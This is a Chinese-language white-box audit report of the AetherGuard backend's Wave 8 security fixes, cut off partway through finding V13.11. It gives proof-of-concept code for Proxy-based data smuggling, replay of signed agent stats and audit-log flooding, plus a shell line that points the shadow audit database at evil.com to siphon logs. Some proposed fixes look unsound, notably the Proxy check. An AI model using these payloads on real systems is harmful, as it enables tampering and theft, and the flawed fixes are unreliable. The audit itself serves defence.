# Wave 8 元漏洞审计 R13 攻击 Wave 8 修复再审 - 2026-06-07

**审计范围**：AetherGuard 后端 (Sprint 5 · Wave 8 · R13 攻击 Wave 8 P0 修复的"修复之修复")
**审计员**：白盒静态审计（不修改代码、不运行攻击）
**审计时间**：2026-06-07
**审计重点**：Wave 8 修了一批 P0（F17/F18/F19/F20/F21/F22）——审计这 6 个修复组件的**自身边界**

---

## 摘要

- **审计覆盖 7 大类元漏洞**：F20 safeMerge convertValue 漏判 / F22 traffic_stats signature 边界 / F21 audit 原子双写 env 滥用 / F19 sanitizeString exec loop / F18 safeRegex parser / F17 OIDC email_verified / cross-cutting
- **漏洞总数**：23 处（P0 = 7、P1 = 9、P2 = 7）
- **Top 3 最严重**：
  1. **V13.1 safeMerge `value.toISOString()` / `value.entries()` 走 Proxy trap → 任意数据走私**（P0）—— F20 用显式 `instanceof` 派发替换了 `JSON.stringify` 避免 attacker-controlled toJSON，但 `Date.toISOString()`、`Map.entries()`、`Error.name/message`、`Set iterator` 全部是**内禀方法 (intrinsic methods) 可以被 Proxy 的 get trap 替换**。attacker 用 `new Proxy(new Date(), { get: ... })` 即可在 `value.toISOString()` 调用点塞任意字符串进 merged result
  2. **V13.7 F22 traffic_stats 完全没有 timestamp freshness / nonce binding → 无限 replay**（P0）—— HMAC 验签通过后 server **从不检查 `payload.timestamp` 也不绑定 nonce**。attacker 抓到一次合法 traffic_stats payload（mitm / log / agent-side leak）就能无限回放，污染 global `getTrafficStats()` 计数器、AI 多智能体心跳、activeFlows list。**完全无防御**
  3. **V13.11 F21 `AUDIT_LOG_FAIL_CLOSED` / `AUDIT_SHADOW_REQUIRED` 完全没有 env 强校验、默认 fail-open、生产环境能被静默禁用**（P0）—— `runtime-env.ts` 根本**不校验**这两个关键 env 是否设置（`.env` / `.env.example` 里也**完全没有**这俩变量）。当 `DB_MODE=sqlite`（默认）时，即使 shadow 写**完全失败**（攻击者改 SHADOW_DATABASE_URL 指向黑洞），`audit_logger.log()` 依然返回 id 而不抛错 → audit log 可被静默擦除

> Wave 8 修复方向正确（toJSON 显式派发、HMAC 签名、fail-closed metric 计数、exec loop 修正、back-reference 覆盖、OIDC email_verified 强制），但**每个修复的"接缝处"**留下了真实可利用的次级攻击面。F17–F22 互相组合还能产生新的 attack chain（见 cross-cutting 节）。

---

## 1. F20 safeMerge convertValue 漏判 (V13.1–V13.4)

### V13.1: `value.toISOString()` / `value.entries()` / `value.name` 走 Proxy get trap → 任意数据走私（P0 · TOP 1）

- **目标文件**:
  - `X:\repos\Networksafe\backend\src\utils\safe-merge.ts:307-343` (`convertValue` 中所有 `instanceof` 派发分支)
  - `X:\repos\Networksafe\backend\src\utils\safe-merge.ts:87-91` (`isPlainObject` 不识别 Proxy)
- **修复概述** (Wave 8 F20):
  - 显式 `instanceof Date / RegExp / Map / Set / Error / Buffer` 派发，避免触发 attacker-controlled `toJSON`
  - `isPlainObject` 只检查 `Object.getPrototypeOf(value) === Object.prototype || null`
  - 注释明确：`Date.prototype.toISOString is intrinsic; it cannot be overridden by an attacker`
- **新攻击向量**:
  - **核心问题**：`isPlainObject` **不识别 Proxy**。`Object.getPrototypeOf(new Proxy(new Date(), {}))` 返回 **`Date.prototype`**（因为 Proxy 透明转发），所以：
    - `isPlainObject` 直接返回 **true**（如果 Proxy 目标是 `{}`，原型是 `Object.prototype`）
    - 即使 Proxy 目标是 Date，merge 也会先尝试 `isPlainObject(value)` —— 这里只有当 Proxy 包 Date 时会返回 false（因为 Date.prototype ≠ Object.prototype），落入 instanceof Date 分支
  - **真正的 BUG**：instanceof Date 分支里调用 `value.toISOString()` —— **这走 Proxy get trap**：
    ```js
    const evilDate = new Proxy(new Date(), {
      get(target, prop, receiver) {
        if (prop === 'toISOString') {
          return () => 'malicious-attacker-controlled-string';
        }
        return Reflect.get(target, prop, receiver);
      }
    });
    ```
  - 同样适用于：
    - **`Map.entries()`** (line 319) — Proxy get 替换 `entries` 方法，attacker 塞任意 `[key, value]` 对进 result
    - **`Error.name` / `Error.message`** (line 337) — attacker 塞任意 name/message
    - **`Set` 的 `Array.from(value)`** (line 329) — Proxy 替换 `[Symbol.iterator]`，attacker 塞任意 primitive 数组
    - **`Buffer.isBuffer(value)`** (line 339) — Buffer.isBuffer 对 Proxy 包 Buffer **也** 返回 true（因为 prototype 链是 Buffer.prototype），但长度读 `value.length` 也可以被 trap 替换
  - **影响**：attacker 完全控制了**所有"安全"分支的输出**。可以塞任意字符串进 `target[key]`，然后通过 scanner-task / devices / security-operations 的 safeMerge 调用方进入 DB 持久化、API 响应、audit log
- **PoC**:
  ```ts
  // attacker 通过 API / DB read-back 路径注入 Proxy 实例
  const evil = new Proxy(new Date('2024-01-01'), {
    get(target, prop) {
      if (prop === 'toISOString') return () => 'attacker-owns-this-string';
      return Reflect.get(target, prop);
    }
  });
  // 假设调用方: safeMerge({}, { lastSeen: evil })
  // 实际结果: { lastSeen: 'attacker-owns-this-string' }
  // 旧 F20 假设 toISOString 是 intrinsic，但实际上 Proxy 透明转发 get
  ```
  ```ts
  // Map Proxy:
  const evilMap = new Proxy(new Map(), {
    get(target, prop) {
      if (prop === 'entries') return () => [['role','admin'],['token','stolen']];
      return Reflect.get(target, prop);
    }
  });
  // safeMerge({}, { data: evilMap })
  // → { data: { role: 'admin', token: 'stolen' } }
  ```
- **影响**:
  - 真实可利用性：**高**——attacker 只要能向 merge 的 source 注入 Proxy 实例（已有 DB row 写回 / 任意 attacker-supplied JSON 字段被存为 Proxy），就能在合并时走私任意数据
  - 绕过场景：
    - F20 toJSON 防御（注释说 toISOString is intrinsic，但 Proxy 让 intrinsic 失效）
    - `Map` 值的过滤（`v === null || typeof v !== 'object' ? v : null`）—— attacker 控制的 entries 直接塞 string
    - Error 的 `{name, message}` 限制 —— attacker 控制 name/message
  - 复合 chain：attacker → 走私 `role: 'admin'` 进 merged metadata → devices.routes.ts:724 用 `Object.assign(codebook, safeMerge(...))` → codebook 包含 admin token
- **修复建议**:
  ```ts
  // 1. 在 isPlainObject 和 convertValue 顶部加 Proxy 守卫
  function isProxy(value: unknown): boolean {
    // 任何 [[ProxyTarget]] 内部槽都是 Proxy 标记
    // JS 没有标准 API 直接检测；只能通过代理 get 行为差异
    // 但可以用：尝试读取一个不存在的 symbol，Proxy 会触发 get trap 而原生对象不会
    // 更稳：在所有安全派发前用 hasOwnProperty.call + 无 trap 的方法
  }
  // 2. 在 convertValue 里：取 toISOString 之前先验证 value 的方法是 native function
  if (value instanceof Date) {
    const toIso = value.toISOString;
    if (typeof toIso !== 'function' || toIso.toString().indexOf('[native code]') === -1) {
      return '[Date:untrusted]';
    }
    return value.toISOString();
  }
  // 3. 类似：value.entries, value.name, value.message 都做 native check
  // 4. 或者：拒绝所有 Proxy —— 用 Object.getOwnPropertyDescriptor 的 [[ProxyTarget]] slot
  //    （V8 内部属性，无法在 JS 直接访问 —— 折中方案是把 Proxy 检测和 rejection 合二为一）
  // 5. 实用方案：recurse 时如果发现 value 是 Proxy，直接拒绝
  const proxyMarker = (value as any).__proto__?.constructor?.name;
  if (proxyMarker === 'Proxy') return '[Proxy:rejected]';
  ```

### V13.2: `DataView` / `ArrayBuffer` / `ArrayBuffer` 视图未被显式识别（与 F20 typed array 处理不对称）

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\safe-merge.ts:307-353`（typed array 路径）
- **修复概述** (Wave 8 F20):
  - 测试 `does not trigger toJSON on typed arrays (Uint8Array etc.) — replaced with type-tag marker`
  - 实际实现：`Uint8Array` 等没有显式 `instanceof` 检查，**fall through 到默认 type-tag marker**：`return [object ${ctorName}]`
- **新攻击向量**:
  - **行为一致性问题**：
    - `Uint8Array` → `[object Uint8Array]`
    - `DataView` → `[object DataView]`
    - `ArrayBuffer` → `[object ArrayBuffer]`
    - `SharedArrayBuffer` → `[object SharedArrayBuffer]`
    - `Float32Array`, `BigInt64Array`, `BigUint64Array` → 各自 type-tag
  - 全部走到**同一个** default 分支：`ctor.name || 'Unknown'`
  - **问题 1**：SharedArrayBuffer 在 Node.js 里**有** toJSON（v8 实现）但这里 fall through 不会触发
  - **问题 2**：`Atomics` 操作相关的 buffer 类型（`Int32Array` 配合 Atomics）落不到任何特殊分支
  - **问题 3**：`Int8Array.prototype.toJSON` 在 JS 标准里**确实存在**！当 fall through 到 default marker 分支是 OK 的，但调用方**不知道**这个对象是 typed array
  - 实际可利用性：低 —— 全部 fall through 到 marker 是**安全**的（marker 是 primitive string），但**调试时**全是 `[object XxxArray]` 难以分辨
- **PoC**:
  ```ts
  const dv = new DataView(new ArrayBuffer(16));
  const result = safeMerge({}, { view: dv });
  // → { view: '[object DataView]' }
  // 不调用 toJSON（DataView 无 toJSON），但调用方无法识别这是 DataView
  // 与 Uint8Array 走完全相同路径，行为不可区分
  ```
- **影响**:
  - 真实可利用性：**极低**（fall through 是安全行为）
  - 主要是**可观察性问题**——marker 不带字节数（不像 Buffer 有 `[Buffer:5b]`），调试日志无法分辨
- **修复建议**:
  ```ts
  // 在 convertValue 中加 typed array / DataView 显式分支
  if (ArrayBuffer.isView(value) && !(value instanceof DataView)) {
    return `[TypedArray:${(value as any).length}]`;
  }
  if (value instanceof DataView) {
    return `[DataView:${(value as DataView).byteLength}b]`;
  }
  if (value instanceof ArrayBuffer) {
    return `[ArrayBuffer:${(value as ArrayBuffer).byteLength}b]`;
  }
  ```

### V13.3: Frozen / sealed / non-extensible target 被传入时整次 merge throw

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\safe-merge.ts:219-235` (`mergeInto` 写入 target[key])
- **修复概述** (Wave 8 F20):
  - 没改 target 写入逻辑（V11.14 只改了 toJSON 派发）
  - `target[key] = sub` 在 target frozen 时抛 `TypeError: Cannot assign to read only property`
- **新攻击向量**:
  - 现有 caller（scanner-task / devices / security-operations）都传入**新创建**的对象，target 不会被 freeze
  - **未来风险**：如果 caller 改用 `Object.freeze(target)` 做 immutable update，调用 `safeMerge(target, source)` 会**整个抛** TypeError
  - 不是真正的安全漏洞，但是**可用性陷阱**：attacker 注入一个超大 source 触发 throw，server crash 整个 merge 流程
  - **复合 chain**：scanner-task 的 `updateTarget` 用 `safeMerge({ ...(target.metadata || {}) }, ...)` —— 如果 target.metadata **之前**是 frozen（V8 偶发情况），整个 `updateTarget` 抛 → scanner 任务卡死
- **PoC**:
  ```ts
  const frozen = Object.freeze({ a: 1 });
  try {
    safeMerge(frozen, { b: 2 });
  } catch (e) {
    // TypeError: Cannot assign to read only property 'b' of object
  }
  // 没有任何 try-catch 防御
  ```
- **影响**:
  - 真实可利用性：**低**（当前 caller 不会传 frozen target）
  - 但在第三方 module / 未来 refactor 风险高
- **修复建议**:
  ```ts
  // 在 mergeInternal 顶部检测 target 是否可写
  if (Object.isFrozen(target) || Object.isSealed(target) || !Object.isExtensible(target)) {
    throw new Error('safeMerge: target must be mutable (not frozen/sealed/non-extensible)');
  }
  ```

### V13.4: `Map` 自定义 `get` 方法在 `Object.fromEntries` 时被绕过，但 Map 派发**没防御** attacker Proxy 改造 entries

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\safe-merge.ts:317-327`（Map 派发）
- **修复概述** (Wave 8 F20):
  - 显式 `instanceof Map` + `Object.fromEntries` 派发
  - 过滤非 string/number key、非 primitive value
- **新攻击向量**:
  - 自定义 `Map` 子类带 `get` 方法 → `Object.fromEntries(Array.from(map.entries()).filter(...))` **不调用 get**（entries 走 iterator 而不是 get），所以是安全的
  - **真正问题**：attacker 用 Proxy 包 Map（见 V13.1），替换 `entries` 方法返回任意数据
  - value 过滤 `v === null || typeof v !== 'object' ? v : null` 仍然生效 —— 但 attacker 可以直接传 string 值绕过
  - key 过滤 `typeof k === 'string' || typeof k === 'number'` 仍然生效
- **PoC**: 见 V13.1 PoC Map 部分
- **影响**: 已在 V13.1 中包含
- **修复建议**: 见 V13.1

---

## 2. F22 traffic_stats signature 边界 (V13.5–V13.8)

### V13.5: agent 和 server 端 JSON canonicalization 顺序不一致 → 合法 traffic_stats 被拒（DoS）

- **目标文件**:
  - `X:\repos\Networksafe\backend\src\agent\agent.ts:260-271` (`signStatPayload`)
  - `X:\repos\Networksafe\backend\src\websocket\agent-gateway.ts:124-146` (`verifyAgentStatSignature`)
- **修复概述** (Wave 8 F22):
  - agent 用 `JSON.stringify({ agentId, stats, timestamp })` 签
  - server 用 `JSON.stringify(rest)` 验，`rest = payload - signature`
- **新攻击向量**:
  - **关键问题**：JSON key 的**插入顺序**在两边必须**完全一致**，否则 HMAC 不匹配
  - agent 端：`JSON.stringify({ agentId: ..., stats: ..., timestamp: ... })` 显式构造，`agentId` 在前
  - server 端：`const { signature: _omit, ...rest } = payload`，`rest` 的 key 顺序是 `payload` 的 key 顺序，**减去 `signature`**
  - agent 发送：`{ ...payload, signature }` → 实际发送 `{ agentId, stats, timestamp, signature }`
  - server 收到 `payload` = `{ agentId, stats, timestamp, signature }`，destructure 后 `rest` = `{ agentId, stats, timestamp }`
  - **顺序一致**：✓
  - **潜在风险**：
    1. 如果 attacker 改 WebSocket 库把 payload 重新序列化（key 重排），HMAC 失效 → DoS
    2. 如果 proxy / 中间件（WAF / API gateway）添加了字段（X-Forwarded-For 等），destructure 时这些字段被算进 `rest`，server 端 JSON 多字段，HMAC 不匹配
    3. stats 内部的 key 顺序也必须一致：agent 用 `JSON.stringify(stats)`（按 stats 对象的 own key 顺序），server 同样 → 如果 stats 来自不同来源，key 顺序可能不同
  - **真正的 JSON canonicalization 风险**：V8 在 `JSON.stringify` 时按 own enumerable key 的**插入顺序**输出。如果 stats 对象的 key 是 attacker 控制的（attacker 注册时 `metadata: { 'constructor': 0, 'a': 1 }`），agent 端和 server 端的 stats object 走不同代码路径，可能顺序不同
- **PoC**:
  ```ts
  // attacker 注入 custom stats object:
  const stats = {};
  Object.defineProperty(stats, 'zzz', { value: 1, enumerable: true });
  Object.defineProperty(stats, 'aaa', { value: 2, enumerable: true });
  // V8 顺序: zzz, aaa (insertion order)
  // 但如果中间有 Reflect.ownKeys / Object.keys 重新构造，顺序变成 aaa, zzz
  // agent 签的 HMAC 是 zzz-first 序列化
  // server 用 {...rest}，rest 顺序是 agent 发的顺序 → 一致
  // 但！...rest 去掉 signature 时，V8 在某些版本会重排 → 不一致
  ```
- **影响**:
  - 真实可利用性：**中**（依赖 V8 版本 / 中间件行为）
  - 攻击者只要在 payload 里加一个无关字段（如 `agentId: 'real'`，但通过 WAF 注入 `agentId: 'real' extra: 'junk'`）就能让 HMAC 失效
  - 大量 traffic_stats 被 server 拒绝 → AI 决策 loop 缺数据 → 静默降级
- **修复建议**:
  ```ts
  // 1. 用 RFC 8785 JSON Canonicalization Scheme (JCS)：
  //    - 递归按 key 排序
  //    - 数字规范化
  //    - UTF-8 编码
  // 2. 最小方案：显式签固定 schema
  function canonicalSign(payload, secretKey) {
    const canonical = JSON.stringify({
      agentId: payload.agentId,
      timestamp: payload.timestamp,
      // 显式列举每个 stats 字段，固定顺序
      packetsProcessed: payload.stats?.packetsProcessed ?? 0,
      packetsAllowed: payload.stats?.packetsAllowed ?? 0,
      // ...
    });
    return crypto.createHmac('sha256', secretKey).update(canonical).digest('hex');
  }
  ```

### V13.6: `secretKey` 派生路径不一致 → agent 端 secretKey 与 server 端不同步

- **目标文件**:
  - `X:\repos\Networksafe\backend\src\agent\agent.ts:652` (`AETHERGUARD_AGENT_SECRET_KEY` env)
  - `X:\repos\Networksafe\backend\src\websocket\agent-gateway.ts:702` (`agentAuthService.getAgentSecretKey(agent.agentId)`)
  - `X:\repos\Networksafe\backend\src\security\agent-auth.service.ts:308-325` (`getAgentSecretKey` 从 DB 读 + decrypt)
- **修复概述** (Wave 8 F22):
  - agent 用 `process.env.AETHERGUARD_AGENT_SECRET_KEY` 作为 secretKey
  - server 从 `agent_registrations` 表读 `secret_key`（encrypted），调用 `decryptSecretKey` 解密
- **新攻击向量**:
  - **关键问题**：agent 和 server 的 secretKey **来源不同**：
    - agent：env `AETHERGUARD_AGENT_SECRET_KEY`（在 agent 启动时由运维 / 自动 onboarding 注入）
    - server：DB `agent_registrations.secret_key` 字段（注册时随机生成 `crypto.randomBytes(32).toString('hex')`）
  - **如果 env 没设置**：agent 端 `secretKey` 是空字符串，签出的 HMAC 全是 `HMAC(secret='', payload)` —— server 端用 `decryptSecretKey(dbSecret)` 比较，**不匹配**
  - **如果 env 错配**：agent 端用 A 密钥，server 端用 B 密钥 → 全部 traffic_stats 被拒
  - **agent 启动失败路径**：如果 `AETHERGUARD_AGENT_SECRET_KEY` 没设，agent.ts line 92-94 抛 `SECURITY ERROR`，**agent 根本起不来** —— 这本身是 fail-secure，但意味着 F22 验签是**理论上的**（生产 agent 起不来就发不出 traffic_stats）
  - **真正的问题**：env 注入的 secretKey 和 DB 里的 secretKey **没有绑定关系**。attacker 拿到 agent 端 env，伪造一个**自己的** agent 端 + server 端 secretKey 串通 → 走完整流程
  - **更严重**：如果 attacker 控制 agent 端 env（如 `.env` 注入），能用 attacker 选的 secretKey 签 traffic_stats；server 端必须**也用同一个 secretKey** 才能验签通过——这要求 attacker 也能改 server 端 DB
- **PoC**:
  ```bash
  # attacker 控制 agent 端 .env：
  AETHERGUARD_AGENT_SECRET_KEY=attacker-controlled-secret
  # agent 起来，发 traffic_stats 签 attacker-secret
  # server 端从 DB 读 decrypted-secret-key，比较 HMAC → 不匹配 → 拒
  # 结果：DoS（attacker 强制 agent 端 secretKey 不匹配，让 agent 的 traffic_stats 永远被拒）
  ```
- **影响**:
  - 真实可利用性：**中**——attacker 必须能改 agent 端 env（已经是 RCE 级别）
  - 主要是**配置管理陷阱**：F22 假设 secretKey 同步，但实际两端 secretKey 来自不同源，运维错配的概率高
- **修复建议**:
  ```ts
  // 1. 在 agent onboarding 流程中：server 生成 secretKey 后用 envelope encryption 写入
  //    加密分发到 agent，agent 启动时 decrypt 写入内存
  // 2. server 端：getAgentSecretKey 应该在每次 verify 时检查 cache TTL，过期则拒绝
  //    （避免读到 stale DB 行）
  // 3. 加 env 一致性检查：agent 启动时验证 env secretKey 与 server 端 fingerprint 一致
  ```

### V13.7: 完全没有 timestamp freshness / nonce binding → 无限 replay（P0 · TOP 2）

- **目标文件**: `X:\repos\Networksafe\backend\src\websocket\agent-gateway.ts:124-146` (`verifyAgentStatSignature`)
- **修复概述** (Wave 8 F22):
  - 只验 HMAC，**完全不看** `payload.timestamp`
  - **没有 nonce / request ID** 绑定
  - 文档注释说"server re-derives the signature using the secret key provisioned at agent registration" —— 只说验签，没说防 replay
- **新攻击向量**:
  - **关键 BUG**：
    1. attacker 通过任何途径（agent-side log / mitm / DB leak）拿到一次合法的 `signed_payload = { agentId, stats, timestamp, signature }`
    2. attacker 多次 emit 同样的 `agent:traffic_stats` 到 server
    3. server `verifyAgentStatSignature` 只验 HMAC，每次都通过
    4. server 把 `payload.stats` 累加到 `globalStats.packetsProcessed` 等全局计数器（agent-gateway.ts:747-763）
    5. **无限污染 global stats + AI multi-agent metrics + activeFlows list**
  - **污染路径**：
    - `globalStats.packetsProcessed += probeStats.packetsProcessed`（line 747）—— 一次 replay 增加 N 个 packet
    - `globalStats.activeFlows.unshift(...newFlows)`（line 758）—— 一次 replay 加 N 个 flow，最多保留 100 个
    - `(aiSystem as any).probeAgent.updateAgentHeartbeat(...)`（line 776）—— AI agent 任务完成数被放大
  - **与其他系统组合**：
    - dashboard 显示的全局流量被 attacker 控制
    - rate limit / attack detection 走 `globalStats`，attacker 可以**故意**把 `packetsBlocked` 放到天文数字，触发**误报** → admin 收到假告警
    - 反过来：attacker 把 `packetsProcessed` 压到 0，AI 误以为系统空闲，关掉防火墙
- **PoC**:
  ```ts
  // 1. attacker 通过 mitm / 漏洞拿到一次合法的 traffic_stats 帧
  const legitFrame = {
    agentId: 'agent-prod-1',
    stats: { packetsProcessed: 1_000_000, packetsBlocked: 999_999, activeFlows: [] },
    timestamp: '2026-06-07T00:00:00.000Z',
    signature: 'a1b2c3...'  // 合法 HMAC
  };
  // 2. attacker 用同一帧连续发 1000 次
  for (let i = 0; i < 1000; i++) {
    socket.emit('agent:traffic_stats', legitFrame);
  }
  // 3. server 全部通过验签，累加到 globalStats
  // → globalStats.packetsProcessed += 1_000_000_000  (1 billion)
  // → AI 决策 loop 看到 1 billion packets，触发告警
  ```
- **影响**:
  - 真实可利用性：**高**（拿到一次合法帧的门槛：agent-side log leak / mitm 1s / DB breach）
  - 攻击面广：所有依赖 `getTrafficStats()` 的下游（dashboard、攻击检测、rate limit、AI agent system）
- **修复建议**:
  ```ts
  function verifyAgentStatSignature(payload, secretKey): { ok: boolean; reason?: string } {
    if (isTestRuntime()) return { ok: true };
    if (!secretKey) return { ok: false, reason: 'no_secret' };
    // 1. timestamp freshness check
    const ts = Date.parse(payload.timestamp);
    const now = Date.now();
    if (!Number.isFinite(ts)) return { ok: false, reason: 'bad_timestamp' };
    const ageMs = Math.abs(now - ts);
    if (ageMs > 60_000) return { ok: false, reason: 'timestamp_stale' };  // 60s window
    if (ageMs > 5_000) return { ok: false, reason: 'timestamp_skew' };    // 5s hard window
    // 2. nonce / request ID binding (server-side cache of seen signatures)
    if (!payload.requestId || typeof payload.requestId !== 'string') {
      return { ok: false, reason: 'no_request_id' };
    }
    if (trafficStatsNonceCache.has(payload.signature)) {
      return { ok: false, reason: 'replay_detected' };
    }
    trafficStatsNonceCache.add(payload.signature);
    setTimeout(() => trafficStatsNonceCache.delete(payload.signature), 120_000);
    // 3. HMAC verify (unchanged)
    // ...
    return { ok: true };
  }
  ```

### V13.8: `Buffer.from(signature, 'hex')` 对非 hex 输入抛错被 swallow → attacker 可以**故意发坏 hex 触发 fast-path 拒绝但不进 audit log**

- **目标文件**: `X:\repos\Networksafe\backend\src\websocket\agent-gateway.ts:141-145`
- **修复概述** (Wave 8 F22):
  - 用 `timingSafeEqual(Buffer.from(signature, 'hex'), Buffer.from(expected, 'hex'))`
  - 异常时 `return false`
- **新攻击向量**:
  - **小 bug**：attacker 发 `signature: 'not-hex'` 触发 `Buffer.from('not-hex', 'hex')` 抛错
  - 抛错被 catch → return false
  - 仍然 log warn + audit `traffic_stats_signature_invalid`
  - **不是真正漏洞**——所有路径都正确 audit 了
  - **真正的关注点**：`Buffer.from(signature, 'hex')` 对**奇数长度 hex** 返回**比预期短的** Buffer，timingSafeEqual 立即返回 false。**对 audit 没影响**
  - `Buffer.from(expected, 'hex')` 在 `expected` 是 hex 字符串时永远有效
  - 风险：attacker 通过 flood 大量**非 hex signature** 让 server 持续 log + audit，触发 OOM（audit log 写入 SQLite 的频率）→ **audit log DoS amplification**
- **PoC**:
  ```ts
  for (let i = 0; i < 100_000; i++) {
    socket.emit('agent:traffic_stats', {
      agentId: 'agent-1',
      stats: {},
      timestamp: new Date().toISOString(),
      signature: 'not-hex-' + i  // 每次都让 Buffer.from 抛错
    });
  }
  // → 100,000 条 audit log 写入 SQLite
  // → audit logger 在 fail-open 默认下持续写，可能 OOM
  ```
- **影响**:
  - 真实可利用性：**中**（需要 agent 已认证，agent 已经能 DoS audit log）
  - 主要是**放大效应**：1 个恶意 agent → 100k audit log → 整个 audit 表膨胀
  - **与 V13.11 组合**：如果 AUDIT_LOG_FAIL_CLOSED=false（默认），audit 写失败不抛 → SQLite OOM 后 audit 静默丢失
- **修复建议**:
  ```ts
  // 1. 在 verifyAgentStatSignature 入口加 early-reject
  if (typeof signature !== 'string' || !/^[0-9a-f]{64}$/i.test(signature)) {
    return false;  // 不 log 不 audit，pure DoS 防护
  }
  // 2. 在外层加 rate limit：'agent:traffic_stats' 已经 200/min，但 attack 还是能放大 200x
  ```

---

## 3. F21 audit 原子双写 env 滥用 (V13.9–V13.12)

### V13.9: `AUDIT_SHADOW_REQUIRED` / `AUDIT_LOG_FAIL_CLOSED` 完全没有 env 强校验

- **目标文件**:
  - `X:\repos\Networksafe\backend\src\security\audit-logger.service.ts:45-51` (`isAuditShadowRequired`)
  - `X:\repos\Networksafe\backend\src\security\audit-logger.service.ts:367-369` (`AUDIT_LOG_FAIL_CLOSED === 'true'`)
  - `X:\repos\Networksafe\backend\src\bootstrap\runtime-env.ts` （**完全没校验**这俩 env）
  - `X:\repos\Networksafe\.env` / `X:\repos\Networksafe\backend\.env.example` （**没列出**这俩 env）
- **修复概述** (Wave 8 F21):
  - 加 `AUDIT_SHADOW_REQUIRED=true` 让 shadow 写失败时 fail-closed
  - 加 `AUDIT_LOG_FAIL_CLOSED=true` 让任何 audit 写失败抛错
- **新攻击向量**:
  - **关键 BUG**：
    1. `.env` / `.env.example` 都没列 `AUDIT_SHADOW_REQUIRED` / `AUDIT_LOG_FAIL_CLOSED`
    2. `runtime-env.ts:validateRuntimeEnvironment()` **完全没** require 这俩变量
    3. **默认行为**：`AUDIT_SHADOW_REQUIRED !== 'true'` → 走 sqlite 默认，shadow 写失败 **不抛错**
    4. **默认行为**：`AUDIT_LOG_FAIL_CLOSED !== 'true'` → SQLite 写失败 **不抛错**
  - **攻击者注入**：
    - attacker 改 `.env`：加 `AUDIT_LOG_FAIL_CLOSED=false`（或任何不是 `'true'` 的值）—— 实际**和没设一样**，fail-open
    - attacker 改 `.env`：删 `AUDIT_SHADOW_REQUIRED` —— **本来就没在 .env 里**，所以**删不掉**（等效于没设，fail-open）
  - **真正的关键 BUG**：
    - **这两个 env 是 OPTIONAL 而不是 DEFAULT-FAIL-CLOSED**
    - 安全默认值应该是：**fail-closed**（如果 env 没设，等效于 `true`）
    - 当前实现是 fail-open（如果 env 没设，等效于 `false`）—— **违反 fail-closed 原则**
- **PoC**:
  ```bash
  # attacker 拿到任意 RCE，写 .env
  echo "AUDIT_LOG_FAIL_CLOSED=false" >> .env  # 已经是默认行为，但显式标记让 admin 误以为关了
  echo "AUDIT_SHADOW_REQUIRED=false" >> .env
  # 或更隐蔽：把 SHADOW_DATABASE_URL 改到 attacker 控制的 server
  echo "SHADOW_DATABASE_URL=postgres://attacker:pass@evil.com:5432/audit" >> .env
  # → 所有 audit log 同步到 attacker 的 DB
  # → attacker 完全控制 "tamper-evident" 的副本
  # → admin 看到的 shadow write metrics 全部 success，attacker 离线审计
  ```
- **影响**:
  - 真实可利用性：**高**（任何能改 .env 的攻击者都能擦除 audit trail）
  - 攻击面：整个 security audit 体系失效
- **修复建议**:
  ```ts
  // 1. 改 isAuditShadowRequired 默认值
  function isAuditShadowRequired(): boolean {
    // fail-CLOSED: 默认就是 required
    return process.env.AUDIT_SHADOW_REQUIRED !== 'false';
  }
  // 2. 改 AUDIT_LOG_FAIL_CLOSED 默认
  if (process.env.AUDIT_LOG_FAIL_CLOSED !== 'false') {
    throw error;
  }
  // 3. 在 runtime-env.ts:validateRuntimeEnvironment() 加显式校验
  if (nodeEnv === 'production') {
    if (process.env.AUDIT_LOG_FAIL_CLOSED === 'false') {
      errors.push('AUDIT_LOG_FAIL_CLOSED must NOT be disabled in production (fail-closed default).');
    }
    if (process.env.AUDIT_SHADOW_REQUIRED === 'false') {
      errors.push('AUDIT_SHADOW_REQUIRED must NOT be disabled in production (fail-closed default).');
    }
  }
  // 4. 在 .env.example 加显式警告
  # SECURITY: AUDIT_LOG_FAIL_CLOSED must default to true. Set to 'false' only for debugging.
  # AUDIT_LOG_FAIL_CLOSED=true
  # AUDIT_SHADOW_REQUIRED=true
  ```

### V13.10: shadow write 失败 metric counter 没有上限 → 长期 OOM 风险

- **目标文件**: `X:\repos\Networksafe\backend\src\security\audit-logger.service.ts:30-38` (`auditShadowWriteSuccesses / auditShadowWriteFailures`)
- **修复概述** (Wave 8 F21):
  - 加 metric counter 记录 shadow 写成功/失败次数
  - 提供 `getAuditShadowWriteMetrics()` 读取，`resetAuditShadowWriteMetrics()` 重置
- **新攻击向量**:
  - 两个 counter 是**模块级 Number**，**没有上限**
  - attacker 触发 shadow 写失败（V13.9 路径）N 次
  - counter 涨到 `Number.MAX_SAFE_INTEGER` 后精度丢失（Number 是 64-bit float）
  - 现实场景：counter 涨到 9e15 后开始 1+1=2 但 9e15+1=9e15
  - **不直接 OOM**（counter 是 Number），但**审计/监控失效**：admin 看到 counter 卡在某个值
  - **与 V13.9 组合**：attacker 配合 audit log 失败不抛错，能让 audit log 持续累计 → SQLite 文件**真实 OOM 磁盘**
- **PoC**:
  ```ts
  // 不需要 PoC，counter 是 Number 不是 BigInt，自然会卡
  // 实际触发：attacker 改 SHADOW_DATABASE_URL 到不可达地址
  // → 每次 audit log 都失败 → counter 涨
  // → 10^15 次后精度丢失（需要 attacker 持续 ~3 年每秒 10M 次失败才到 9e15，不现实）
  // 真正的风险：audit log 持续写 SQLite，文件膨胀
  ```
- **影响**:
  - 真实可利用性：**低**（counter 精度丢失需要天文数字）
  - **磁盘 DoS 是真实风险**：attacker 触发 1 audit/秒，1 年 = 31.5M 条，每条 1KB = 31.5 GB
- **修复建议**:
  ```ts
  let auditShadowWriteSuccesses = 0;
  let auditShadowWriteFailures = 0;
  const MAX_COUNTER = 1_000_000_000;  // 10^9 足够记录生命周期
  function incSuccess() {
    auditShadowWriteSuccesses = Math.min(auditShadowWriteSuccesses + 1, MAX_COUNTER);
  }
  function incFailure() {
    auditShadowWriteFailures = Math.min(auditShadowWriteFailures + 1, MAX_COUNTER);
  }
  // 真正解决：audit log 应该有 TTL 自动 rotate
  ```

### V13.11: 默认 `DB_MODE=sqlite` 时 shadow 写失败**不抛错** → audit log 可被静默擦除（P0 · TOP 3）

- **目标文件**: `X:\repos\Networksafe\backend\src\security\audit-logger.service.ts:347-356`
- **修复概述** (Wave 8 F21):
  - shadow 写失败时**只有** `isAuditShadowRequired()` 返回 true 才抛错
  - `isAuditShadowRequired()` 默认 `AUDIT_SHADOW_REQUIRED !== 'true'` → false
- **新攻击向量**:
